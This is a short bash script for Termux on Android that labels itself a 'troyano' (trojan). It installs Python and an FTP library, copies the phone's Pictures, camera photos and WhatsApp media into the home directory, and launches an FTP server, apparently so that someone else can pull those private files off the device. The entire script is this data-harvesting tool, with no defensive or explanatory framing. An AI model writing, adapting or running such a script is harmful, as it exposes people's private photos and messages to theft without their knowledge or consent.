#! /bin/bash

termux-setup-storage
apt update
pkg install figlet
pkg install python
pkg install python2 
pip install pyftpdlib
pip install pyopenssl
setterm -foreground green
figlet Troyano
echo ""
echo "Espere cargando troyano ...."
cd /sdcard
cp -r Pictures /$HOME
cp -r /sdcard/DCIM/Camera /$HOME
cp -r /sdcard/Android/media/com.whatsapp /$HOME
cd /$HOME/Troy9
echo "Haciendo un troyano" & python ftpserver.py
